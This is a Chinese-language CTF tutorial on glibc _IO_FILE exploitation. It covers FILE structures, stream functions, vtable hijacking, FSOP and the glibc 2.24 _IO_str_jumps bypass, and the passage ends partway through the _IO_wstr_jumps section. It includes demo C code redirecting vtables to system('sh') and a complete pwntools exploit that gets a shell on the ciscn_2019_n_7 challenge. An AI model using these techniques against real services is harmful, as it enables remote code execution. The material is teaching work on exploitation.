# Pwn _IO_FILE

## IO 结构体知识

### _IO_FILE 结构

FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值——文件描述符（eg:stdin=0;stdout=1)。

在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：**stdin、stdout、stderr，分别对应文件描述符：0、1、2**。假设现在第一次用 fopen 打开一个文件流，这个文件流的文件描述符就为 3 。默认打开的三个文件流分配 libc data 段。fopen 等文件流控制函数创建的文件流是分配在堆上。

FILE 结构体定义在 libio.h ：

```c
struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

**每个文件流都有自己的 FILE 结构体**。我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是

```
_IO_2_1_stderr_
_IO_2_1_stdout_
_IO_2_1_stdin_
```

在 ida 中搜索 ``_IO_2_1_stdxxx_`` 或者 ``stdxx`` 这个变量会存储 FILE 结构体地址：

![image-20201210083553060](https://gitee.com/mrskye/Picbed/raw/master/img/20201210083553.png)

 gdb 调试中查看结构体内容：

![image-20201210083345062](https://gitee.com/mrskye/Picbed/raw/master/img/20201210083345.png)

进程中的 FILE 结构会通过 \_chain 域彼此连接形成一个链表（上图可见指向 \_IO_2_1_strout ），**链表头部用全局变量 \_IO_list_all 表示**，通过这个值我们可以遍历所有的 FILE 结构（FSOP 攻击利用到这个特性）。

### _IO_FILE_plus 结构

但是事实上 \_IO_FILE 结构外包裹着另一种结构 _IO_FILE_plus ，其中包含了一个重要的**指针 vtable 指向了一系列函数指针**。

在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8

```c
struct _IO_FILE_plus
{
    _IO_FILE    file;
    _IO_jump_t   *vtable;
}
```

_IO_FILE_plus 结构体&各个偏移，当中 0x0 ~ 0xc4 其实就是 \_IO_FILE 结构，最后加上 vtable 指针指向 \_IO_jump_t ：

```c
//p *((struct _IO_FILE_plus*)[地址])
0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
//IO_FILE_complete
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
```



### _IO_jump_t 结构

vtable 是 \_IO_jump_t 类型的指针，指向的 \_IO_jump_t 结构体中保存了一堆函数指针，这有点像 c++ 的虚函数结构体，在后面我们会看到在一系列标准 IO 函数中会调用这里面的函数指针。

在 ida 中可以找 ``_IO_2_1_stderr_`` 结构体后面的 ``dq offset _IO_file_jumps`` 跳转到结构体。或者直接搜索 ``_IO_file_jumps`` ，vtable 实际指向的结构体名字。

```c
//p *((struct _IO_jump_t*)[地址])
void * funcs[] = {
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

### 小结

- **stdin、stdout、stderr** 文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上
- **stdin、stdout、stderr，分别对应文件描述符：0、1、2**，开启新的文件流文件描述符从 3 开始递增
- 每个文件流都单独的 \_IO_FILE  、\_IO_FILE_plus 结构体，``_IO_jump_t   *vtable``只有一个各个文件流公用
- 指针 vtable 指向了一系列函数指针，各种 IO 操作均是通过 vtable 指向各个具体函数实现功能
- 文件流通过 \_chain 构成链表，**链表头部用全局变量 \_IO_list_all 表示**
- ida 中通过搜索文件流名可以找到 \_IO_FILE  、\_IO_FILE_plus ，根据偏移（结构体最后位置）找到 vtable （eg:_IO_2_1_stderr_)

## 涉及文件流部分函数

### fread

> 涉及源码文件：
>
> ```c
> libio/iofread.c
> libio/genops.c
> libio/libioP.h
> libio/fileops.c
> ```

fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下

```c
size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;
```

- buffer 存放读取数据的缓冲区。
- size：指定每个记录的长度。
- count： 指定记录的个数。
- stream：目标文件流。
- 返回值：返回读取到数据缓冲区中的记录个数

fread 的代码位于 / libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。

```c
_IO_size_t
_IO_fread (buf, size, count, fp)
     void *buf;
     _IO_size_t size;
     _IO_size_t count;
     _IO_FILE *fp;
{
  ...
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
  ...
}
```

在_IO_sgetn 函数中会调用_IO_XSGETN，而_IO_XSGETN 是_IO_FILE_plus.vtable 中的函数指针，在*调用这个函数时会首先取出 vtable 中的指针然后再进行调用*。

```c
_IO_size_t
_IO_sgetn (fp, data, n)
     _IO_FILE *fp;
     void *data;
     _IO_size_t n;
{
  return _IO_XSGETN (fp, data, n);
}
```

在默认情况下函数指针是指向_IO_file_xsgetn 函数的，

```c
  if (fp->_IO_buf_base
          && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
        {
          if (__underflow (fp) == EOF)
        break;

          continue;
        }
```

### fwrite

> 涉及源码文件：
>
> ```c
> libio/iofwrite.c
> libio/libioP.h
> libio/fileops.c
> ```

fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下

```c
size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);
```

- buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;
- size: 要写入内容的单字节数;
- count: 要进行写入 size 字节的数据项的个数;
- stream: 目标文件指针;
- 返回值：实际写入的数据项个数 count。

fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。

根据前面对_IO_FILE_plus 的介绍，可知_IO_XSPUTN 位于_IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。

```c
written = _IO_sputn (fp, (const char *) buf, request);
```

在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW

```c
 /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
```

_IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow

```c
if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
             f->_IO_write_ptr - f->_IO_write_base);
  if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return EOF;
```

在_IO_new_file_overflow 内部最终会调用系统接口 write 函数

### fopen

> 涉及源码文件：
>
> ```c
> libio/iofopen.c
> libio/fileops.c
> libio/genops.c
> ```

fopen 在标准 IO 库中用于打开文件，函数原型如下

```c
FILE *fopen(char *filename, *type);
```

- filename: 目标文件的路径
- type: 打开方式的类型
- 返回值: 返回一个文件指针

在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程

首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的

```c
*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));
```

之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作

```c
_IO_JUMPS (&new_f->fp) = &_IO_file_jumps;
_IO_file_init (&new_f->fp);
```

在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中

```c
void
_IO_link_in (fp)
     struct _IO_FILE_plus *fp;
{
    if ((fp->file._flags & _IO_LINKED) == 0)
    {
      fp->file._flags |= _IO_LINKED;
      fp->file._chain = (_IO_FILE *) _IO_list_all;
      _IO_list_all = fp;
      ++_IO_list_all_stamp;
    }
}
```

之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。

```c
if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)
    return __fopen_maybe_mmap (&new_f->fp.file);
```

总结一下 fopen 的操作是

- 使用 malloc 分配 FILE 结构
- 设置 FILE 结构的 vtable
- 初始化分配的 FILE 结构
- 将初始化的 FILE 结构链入 FILE 结构链表中
- 调用系统调用打开文件

### fclose

> 涉及源码文件：
>
> ```c
> libio/iofclose.c
> ```

fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。

```c
int fclose(FILE *stream)
```

功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区

fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链

```c
if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);
```

之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件

```c
if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
```

最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构

```c
_IO_FINISH (fp);
```

### printf/puts

printf 和 puts 是常用的输出函数，在 printf 的参数是以'\n'结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。

puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会**调用 vtable 中的_IO_sputn**，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。

printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现

```c
vfprintf+11
_IO_file_xsputn
_IO_file_overflow
funlockfile
_IO_file_write
write
```

## 伪造 vtable 劫持程序流程

> <libc 2.23 --> 修改 vtable 中某些函数的指针
>
> \>=libc 2.23 --> 通过伪造 vtable 结构体来调用某些函数的指针

### 简介

IO 操作函数需要经过 FILE 结构进行处理。尤其是 _IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。

因此伪造 vtable 劫持程序流程的中心思想就是**针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。**

**vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。**

### 原理示例 

修改 vtable 中的指针，

```c
int main(void)
{
    FILE *fp;
    long long *vtable_ptr;
    fp=fopen("123.txt","rw");
    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable
    vtable_ptr[7]=0x41414141 //xsputn
    printf("call 0x41414141");
}
```

根据 vtable 在 \_IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后搞清楚劫持的 IO 函数会调用 vtable 中的哪个虚函数。vtable 函数进行调用时，传入的第一个参数其实是对应的 _IO_FILE_plus 地址。比如调用 printf ，传递给 vtable 的第一个参数是 \_IO_2_1_stdout\_ 的地址。利用这点可以实现给劫持的 vtable 函数传參，比如

```c
#define system_ptr 0x7ffff7a52390;

int main(void)
{
    FILE *fp;
    long long *vtable_ptr;
    fp=fopen("123.txt","rw");
    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable

    memcopy(fp,"sh",3);

    vtable_ptr[7]=system_ptr //xsputn


    fwrite("hi",2,1,fp);
}
```

但是在目前 **libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的**。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。

```c
#define system_ptr 0x7ffff7a52390;

int main(void)
{
    FILE *fp;
    long long *vtable_addr,*fake_vtable;

    fp=fopen("123.txt","rw");
    fake_vtable=malloc(0x40);

    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset

    vtable_addr[0]=(long long)fake_vtable;

    memcpy(fp,"sh",3);

    fake_vtable[7]=system_ptr; //xsputn

    fwrite("hi",2,1,fp);
}
```

我们首先分配一款内存来存放**伪造的 vtable，之后修改 _IO_FILE_plus 的 vtable 指针指向这块内存**。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 "/bin/sh" 或 "sh"。

**因为 vtable 中的函数调用时会把对应的 \_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 "sh" 写入 _IO_FILE_plus 头部**。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system("sh")。

同样，如果程序中不存在 fopen 等函数创建的 \_IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的 _IO_FILE ，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。

```
print &_IO_2_1_stdin_
$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 <_IO_2_1_stdin_>

0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
```

### 小结

* vtable 劫持分为两种：
  * 直接改写 vtable 中的虚函数指针
  * 覆盖 vtable 的指针（伪造 vtabel）
* libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入
* vtable 中的函数调用时会把对应的 \_IO_FILE_plus 指针作为第一个参数传递，可以将 sh 或其他参数写入 _IO_FILE_plus 头部

### 例题

#### 2018 HCTF the_end

> [题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/)
>
> 通过伪造 vtabel 实现运行特定函数（修改虚函数的 overflow 指针）
>
> 其他做法：https://blog.csdn.net/Mira_Hu/article/details/103736917

##### 基本情况

除了 canary 保护全开，任意地址写 5 字节

##### 思路

在程序调用 exit 后，会遍历 _IO_list_all ，调用 _IO_2_1_stdout_ 下的 vatable 中 _setbuf 函数。先修改两个字节在当前 vtable 附近伪造一个 fake_vtable ，然后使用 3 个字节修改 fake_vtable 中 _setbuf 的内容为 one_gadget 。

## FSOP

### 介绍

进程内所有的 \_IO_FILE 结构会使用 \_chain 域相互连接形成一个链表，这个链表的头部由 \_IO_list_all 维护。

FSOP 的核心思想就是劫持 \_IO_list_all 的值来伪造链表和其中的 \_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用 \_IO_flush_all_lockp，这个函数会刷新 \_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用 \_IO_FILE_plus.vtable 中的 _IO_overflow。

```c
int
_IO_flush_all_lockp (int do_lock)
{
  ...
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
  {
       ...
       if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
               && _IO_OVERFLOW (fp, EOF) == EOF)
           {
               result = EOF;
          }
        ...
  }
}
```

![img](https://gitee.com/mrskye/Picbed/raw/master/img/20201210172118.jpeg)

而 \_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：

1. 当 libc 执行 abort 流程时

2. 当执行 exit 函数时

   ![image-20201208195441734](https://gitee.com/mrskye/Picbed/raw/master/img/20201210172159.png)

3. 当执行流从 main 函数返回时

### 原理示例 

FSOP 利用的条件：泄露 libc.so 基址，因为 \_IO_list_all 是作为全局变量储存在 libc.so 中的；用任意地址写把 \_IO_list_all 改为指向可控内存的地址；伪造 \_IO\_FILE\_plus 结构体。伪造结构体需要 bypass 这些 check ：

```c
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
               && _IO_OVERFLOW (fp, EOF) == EOF)
           {
               result = EOF;
          }
```

也就是

- **fp->_mode <= 0**
- **fp->_IO_write_ptr > fp->_IO_write_base**

写一个 demo 验证一下：首先分配一块内存用于存放伪造 _IO_FILE_plus（\_IO_FILE、vtable)。\_IO_write_ptr、\_IO_write_base、\_mode 等数据偏移如下（可以通过查前面给出结构体算出来）：

```c
#define _IO_list_all 0x7ffff7dd2520
#define writebase_offset 0x20
#define writeptr_offset 0x28
#define mode_offset 0xc0
#define vtable_offset 0xd8

int main(void)
{
    void *ptr;
    long long *list_all_ptr;
    ptr=malloc(0x200);
		//bypass
    *(long long*)((long long)ptr+mode_offset)=0x0;
    *(long long*)((long long)ptr+writeptr_offset)=0x1;
    *(long long*)((long long)ptr+writebase_offset)=0x0;
    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);
		//vtable _IO_overflow
    *(long long*)((long long)ptr+0x100+24)=0x41414141;
		//orw _IO_list_all _chain 2 fake _IO_FILE_plus
    list_all_ptr=(long long *)_IO_list_all;
    list_all_ptr[0]=ptr;
    exit(0);
}
```

前 0x100 个字节作为 \_IO_FILE ，后 0x100 个字节作为 vtable ，在 vtable _IO_overflow 指针劫持为 0x41414141 。

之后，覆盖 libc 中的全局变量 \_IO_list_all 指向伪造的 _IO_FILE_plus 。

> 全局变量 \_IO_list_all 存储着结构体 _IO_FILE_plus 的地址，这个地址也是 \_IO_FILE 所在地址，后面是 vtable 

通过调用 exit 函数，程序会执行 \_IO_flush_all_lockp，经过 fflush[^1] 获取 \_IO_list_all 的值并取出作为 \_IO_FILE_plus **调用其中的 \_IO_overflow 函数**实现功能：

```
---> call _IO_overflow
[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock=0x0)
[#1] 0x7ffff7a8932a → Name: _IO_cleanup()
[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status=0x0, listp=<optimized out>, run_list_atexit=0x1)
[#3] 0x7ffff7a47045 → Name: __GI_exit(status=<optimized out>)
[#4] 0x4005ce → Name: main()
```

### 例题

#### ciscn_2019_n_7

> 大体是用 FSOP 思路，不是劫持 _IO_list_all _chain 指针伪造一个结构体；而直接修改 \_IO\_FILE\_plus 

#### 基本情况

保护全开，用的是 buu 的远程环境对应是 Ubuntu 16 libc 2.23：

```shell
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
FORTIFY:  Enable
```
程序只能有一个堆，用结构体维护，结构如下：

```c
struct {
  size;//8bit
  data;//8bit
  chunk_addr;//8bit  
}
```

#### 漏洞

在 add 时写入 author 时溢出 8 bit 刚好可以覆盖堆指针：

![image-20201210201615356](https://gitee.com/mrskye/Picbed/raw/master/img/20201210201615.png)

结合 edit 可以多次修改堆指针，实现任意地址多次写入：

![image-20201210201739661](https://gitee.com/mrskye/Picbed/raw/master/img/20201210201739.png)

#### 思路

myexit 函数有关闭 stdout、stderr 后执行 exit() ，exit() 时系统会调用 \_IO_flush_all_lockp 。修改堆指针到 \_IO_2_1_stderr_ ，布置绕过绕过需要的数据；在适当位置写入 system ，将 vtable 劫持到这个空间上，完成劫持 \_IO_flush_all_lockp 为 system 。写入 \_IO_2_1_stderr_ 时将 /bin/sh 写到 \_IO_FILE 的头部，调用虚函数时 \_IO_FILE 是第一个参数。

> 因为 vtable 中的函数调用时会把对应的 \_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 "sh" 写入 _IO_FILE_plus 头部。

**调试查看结构体**：

```shell
p *((struct [结构体类型]*)[地址])
```

#### EXP

```python
from pwn import *
context(log_level='debug')#,terminal=['tmux','sp','-h'])

#p = process("./ciscn_2019_n_7")
p = remote("node3.buuoj.cn",28957)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF('./libc-2.23.so')
elf = ELF("./ciscn_2019_n_7")

def command(id):
    p.recvuntil("-> \n")
    p.sendline(str(id))
def edit(name, content):
    command(2)
    p.recvuntil("New Author name:\n")
    p.sendline(name)
    p.recvuntil("New contents:\n")
    p.send(content)

command(666)
puts_addr = int(p.recv(14),16)
log.info("puts_addr:"+hex(puts_addr))
libc_base = puts_addr-libc.sym['puts']
log.info("libc_base:"+hex(libc_base))

# IO_list_all=libc_base+libc.sym['_IO_list_all']
# log.info("IO_list_all:"+hex(IO_list_all))
IO_2_1_stderr=libc.sym['_IO_2_1_stderr_']+libc_base
log.info("IO_2_1_stderr:"+hex(IO_2_1_stderr))
system=libc_base+libc.sym['system']
log.info("system:"+hex(system))


command(1)
p.recvuntil(": \n")
p.sendline(str(0xf8))
p.recvuntil(":\n")
payload = 'a'*8 + p64(IO_2_1_stderr)
p.send(payload)

#gdb.attach(p,"b *$rebase(0xb02)")

#define writebase_offset 0x20   ->0
#define writeptr_offset 0x28    ->1
#define mode_offset 0xc0        ->0
#define vtable_offset 0xd8      ->system&onegadget

payload = '/bin/sh\x00'.ljust(0x20,'\x00') + p64(0) + p64(1)#0x30
payload += p64(0)*4 + p64(system)*4#p64(libc_base+0x4526a)*4#0x50-0x70
payload = payload.ljust(0xd8, '\x00')
payload += p64(IO_2_1_stderr+0x40)
edit('a\n', payload)

command(4)

p.sendline('exec 1>&0')
p.interactive()
```



## glibc 2.24 利用

### 新增防御机制

glibc 2.24 后新增 vtable 检查函数：IO_validate_vtable 和 \_IO_vtable_check 。

> libio/libioP.h
>
> libio/vtables.c

vtables 被放进了专用的只读的 `__libc_IO_vtables` 段，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用 \_IO_vtable_check 。

很多对 vtable 的攻击方式不再适用，思路转向 stream_buffer 

### _IO_str_jumps

libc 中不仅仅只有 \_IO_file_jumps 一个 vtable ，还有一个叫 \_IO_str_jumps 的 ，这个 vtable 不在 check 范围之内。

比如 `_IO_str_jumps`（该符号在strip后会丢失）：

```c
// libio/strops.c

const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

// libio/libioP.h

#define JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)
```

`_IO_str_jumps` 中包含了一个叫做 `_IO_str_overflow` 的函数，该函数中存在相对地址的引用（可伪造）：

```c
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))                       // 条件 #define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
    return EOF;
      else
    {
      char *new_buf;
      char *old_buf = fp->_IO_buf_base;
      size_t old_blen = _IO_blen (fp);
      _IO_size_t new_size = 2 * old_blen + 100;                                 // 通过计算 new_size 为 "/bin/sh\x00" 的地址
      if (new_size < old_blen)
        return EOF;
      new_buf
        = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);     // 在这个相对地址放上 system 的地址，即 system("/bin/sh")
    [...]
// libio/strfile.h

struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};

struct _IO_streambuf
{
  struct _IO_FILE _f;
  const struct _IO_jump_t *vtable;
};

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;
```

所以可以像下面这样构造：

- fp->_flags = 0
- fp->_IO_buf_base = 0
- fp->_IO_buf_end = (bin_sh_addr - 100) / 2
- fp->_IO_write_ptr = 0xffffffff
- fp->_IO_write_base = 0
- fp->_mode = 0

有一点要注意的是，如果 bin_sh_addr 的地址以奇数结尾，为了避免除法向下取整的干扰，可以将该地址加 1。另外 system("/bin/sh") 是可以用 one_gadget 来代替的，这样似乎更加简单。

完整的调用过程：`malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_overflow`。

与传统的 house-of-orange 不同的是，这种利用方法不再需要知道 heap 的地址，因为 `_IO_str_jumps` vtable 是在 libc 上的，所以只要能泄露出 libc 的地址就可以了。

在 `_IO_str_jumps` 中，还有另一个函数 `_IO_str_finish`，它的检查条件比较简单：

```c
void
_IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))             // 条件
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);     // 在这个相对地址放上 system 的地址
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```

只要在 `fp->_IO_buf_base` 放上 "/bin/sh" 的地址，然后设置 `fp->_flags = 0` 就可以了绕过函数里的条件。

那么怎样让程序进入 `_IO_str_finish` 执行呢，`fclose(fp)` 是一条路，但似乎有局限。还是回到异常处理上来，在 `_IO_flush_all_lockp` 函数中是通过 `_IO_OVERFLOW` 执行的 `__GI__IO_str_overflow`，而 `_IO_OVERFLOW` 是根据 `__overflow` 相对于 `_IO_str_jumps` vtable 的偏移找到具体函数的。所以如果我们伪造传递给 `_IO_OVERFLOW(fp)` 的 fp 是 vtable 的地址减去 0x8，那么根据偏移，程序将找到 `_IO_str_finish` 并执行。

所以可以像下面这样构造：

- fp->_mode = 0
- fp->_IO_write_ptr = 0xffffffff
- fp->_IO_write_base = 0
- fp->_wide_data->_IO_buf_base = bin_sh_addr （也就是 fp->_IO_write_end）
- fp->_flags2 = 0
- fp->_mode = 0

完整的调用过程：`malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_finish`。

### _IO_wstr_jumps

`_IO_wstr_jumps` 也是一个符合条件的 vtable，总体上和上面讲的 `_IO_str_jumps` 差不多：

```c
// libio/wstrops.c

const struct _IO_jump_t _IO_wstr_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_wstr_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstr_overflow),
